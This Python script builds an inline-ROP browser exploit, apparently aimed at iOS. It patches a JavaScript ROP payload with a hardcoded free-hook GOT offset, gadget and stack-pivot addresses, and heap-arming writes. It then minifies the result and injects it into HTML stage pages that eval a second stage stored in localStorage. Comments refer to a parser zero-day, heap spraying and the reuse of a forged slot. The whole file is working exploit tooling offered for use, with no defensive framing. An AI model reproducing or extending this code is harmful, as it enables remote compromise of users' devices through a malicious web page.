#!/usr/bin/env python3
"""Build the inline-ROP exploit: the 3,617 stage B stays in n1s2; the ROP is
inlined in the 3,969 exploit.  Uses the app free GOT slot (base+0x69091f8)
instead of the generic resolver."""
import hashlib, os, re, subprocess, sys, zlib
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE); PAY=os.path.join(LAB,'payload')
S=open(os.path.join(PAY,'srop.js')).read()
a0=S.find('/* ===== iOS 6s base/libcFree/gadgets'); o0=S.find('var OPEN=',a0)
assert a0>0 and o0>a0
rop_tail=S[o0:S.find('u()}();',o0)]
PUT_OLD='function put64_(arr,off,val){var v=u64(val);for(var i=0;i<8;i++)arr[off+i]=Number((v>>BigInt(i*8))&0xffn);}'
BT_DEF='\nfunction bt(x){var t=new Array(8);for(var i=0;i<8;i++)t[i]=Number(x>>BigInt(i*8)&0xffn);return t}'
TRIG_OLD='var TRIG=new Uint8Array(0x400);for(var i1=0;i1<0x400;i1++)TRIG[i1]=0;'
TRIG_NEW='var TRIG=new Uint8Array(4096);for(var i1=0;i1<4096;i1++)TRIG[i1]=0;'
ARM_OLD=('h(RT_FREE,G_CALL);h(RT_OPAQUE,ZERO);h(RT_USABLE,PIVOT2);h(RT_SIZE,HUGE);\n'
         'TRIG=null;\ni("U_AFTER");')
ARM_NEW=('var bF=bt(G_CALL),bO=bt(0n),bS=bt(0xffffffffffffffffn),bP=bt(PIVOT2);\n'
         'g0(d);\n'
         'for(var q1=0;q1<8;q1++)v[0x10+q1]=bF[q1];\n'
         'for(var q2=0;q2<8;q2++)v[0x40+q2]=bO[q2];\n'
         'for(var q3=0;q3<8;q3++)v[0x30+q3]=bS[q3];\n'
         'for(var q4=0;q4<8;q4++)v[0x20+q4]=bP[q4];\n'
         'TRIG=null;\ni("U_AFTER");')
UB_OLD='var UB=new Uint8Array(2048);for(var i0=0;i0<2048;i0++)UB[i0]=0;put64_(UB,0x400,MAG);'
UB_NEW='var UB=globalThis.UB;if(!UB){i("U_NOUB");return;}put64_(UB,0x400,MAG);'
def rop_body(host=False):
    head=('var libcFree=0x100000000000n;' if host else
          'var libcFree=_(T+0x69091f8n);if(!c(libcFree)){i("U_NO_FREE");return;}')
    b=head+rop_tail
    assert UB_OLD in b, 'UB allocation line not found in srop.js tail'
    b=b.replace(UB_OLD,UB_NEW,1)
    if host:
        b=b.replace('var HOSTCFG=0;','var HOSTCFG=1;')
    # calibration line: U (UB data), D (scan centre), signed distance, rt
    old_rdy='i("U_RDY "+a(U)+" PATH="+PATH);'
    new_rdy=('i("U_RDY "+a(U)+" D="+a(b)+" DL="+a(U>b?U-b:b-U)+" O="'
             '+(off>b?"+":"-")+a(off>b?off-b:b-off)+" RT="+a(d)+" PATH="+PATH);')
    assert old_rdy in b
    b=b.replace(old_rdy,new_rdy,1)
    # 4096-byte TRIG (device-proven size; the js_free_rt continuation reads its
    # saved frame from the block up to ~0x280, and the proven endgame used 4096)
    assert TRIG_OLD in b
    b=b.replace(TRIG_OLD,TRIG_NEW,1)
    # allocation-free arm in the proven order: rt+0x10=G_CALL, rt+0x40=0,
    # rt+0x30=huge, rt+0x20=PIVOT2, then drop TRIG.  The h() writer allocates
    # ~16 BigInts per call, i.e. frees blocks after the free hook is armed.
    assert ARM_OLD in b, 'arm block not found'
    b=b.replace(ARM_OLD,ARM_NEW,1)
    assert PUT_OLD in b, 'put64_ not found'
    b=b.replace(PUT_OLD,PUT_OLD+BT_DEF,1)
    return b
def iife(body):
    return '(function(){var T=B,S=F,d=globalThis.U,b=D,_=R,h=W,y=Y,a=X,i=M,c=K,v=N,g0=G;'+body+'})();'
def minify(src,name):
    p=os.path.join(PAY,name); open(p,'w').write(src)
    m=os.path.join(PAY,name.replace('.js','_min.js'))
    subprocess.run(['terser',p,'-c','-m','--format','quote_style=1','-o',m],check=True)
    return open(m).read(),m
INJ=("globalThis.R=_;globalThis.W=h;globalThis.D=b;globalThis.U=d;globalThis.F=S;"
     "globalThis.B=T;globalThis.Y=y;globalThis.X=a;globalThis.M=i;globalThis.K=c;"
     "globalThis.N=ABV;globalThis.G=O;i(\"IOS_N1_OK")
UBINJ=None  # stage-B injection variant rejected: allocating the UB inside the
            # stored stage B crashes the stage B on the host twin (heap reuse
            # of the forged slot).
# The UB is allocated in stage A right after the T[] ArrayBuffer(72) spray and
# BEFORE the parser-0day hole-reuse loop: it is then ~1 KB from D (host O=-0x3d0)
# and cannot collide with the forged slot (allocated before the frees), and the
# stored stage B runs byte-identically to the no-UB payload (host iOS stage B:
# clean NO_BASE instead of the segfault seen with the after-forge allocation).
UBALLOC=('var UB=new Uint8Array(2048);for(var j=0;j<2048;j++)UB[j]=0;'
         'UB[0x400]=0x88;UB[0x401]=0x77;UB[0x402]=0x66;UB[0x403]=0x55;'
         'UB[0x404]=0x44;UB[0x405]=0x33;UB[0x406]=0x22;UB[0x407]=0x11;'
         'globalThis.UB=UB;\n')
def stage_a(H,rop_min,host=False):
    base=os.path.join(PAY,f'ls_final_h{H}_2036.html')
    h=open(base).read(); a=re.findall(r'<script>(.*?)</script>',h,re.S)[0]
    old='''var s2=null; try{s2=localStorage.getItem("n1s2");}catch(e){}
if(hit>=0 && s2){ try{(0,eval)(s2);}catch(e2){} }'''
    new=('var s2=null; try{s2=localStorage.getItem("n1s2");}catch(e){}\n'
         'globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);\n'
         'if(hit>=0 && s2){\n'
         ' try{s2=s2.replace(\'i("IOS_N1_OK\',\''+INJ+'\');(0,eval)(s2);}catch(e2){}\n'
         ' try{if(globalThis.U){'+rop_min+'}}catch(e3){}\n'
         '}\n')
    assert a.count('var hit=-1')==1, H
    a=a.replace('var hit=-1',UBALLOC+'var hit=-1',1)
    assert old in a, H
    a=a.replace(old,new,1)
    return ('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
            '<div id="v">X</div>\n<script>'+a+'</script>\n</body></html>')
if __name__=='__main__':
    for tag,host in (('ios',False),('host',True)):
        b=rop_body(host); i=iife(b); mini,path=minify(i,f'rop_inline_{tag}.js')
        print(tag,'body',len(b),'iife',len(i),'min',len(mini))
        for H in (200,150):
            h=stage_a(H,mini,host)
            fn=f'ls_final_inline_h{H}_{tag}_in.html'; open(os.path.join(PAY,fn),'w').write(h)
            print(fn,'raw',len(h),'zlib9',len(zlib.compress(h.encode(),9)),'sha',hashlib.sha256(h.encode()).hexdigest())
